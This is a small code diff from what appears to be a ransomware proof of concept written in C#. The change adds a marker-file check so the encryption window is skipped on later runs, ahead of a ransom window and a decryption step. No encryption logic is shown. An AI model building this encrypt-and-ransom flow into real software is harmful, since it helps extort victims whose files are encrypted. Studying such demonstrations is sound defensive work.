@@ -42,7 +42,8 @@ namespace DUMB
                     {
                         Application.EnableVisualStyles();
                         Application.SetCompatibleTextRenderingDefault(false);
-                        Application.Run(new CryptWindow(false)); //Encrypt, you wouldn't actually do this in a ransomware, this is purely for the PoC
+                        if(!File.Exists(folder + "crypted"))
+                            Application.Run(new CryptWindow(false)); //Encrypt, you wouldn't actually do this in a ransomware, this is purely for the PoC
                         Application.Run(new Main()); //Ransom window
                         Application.Run(new CryptWindow(true)); //Decrypt
                     }
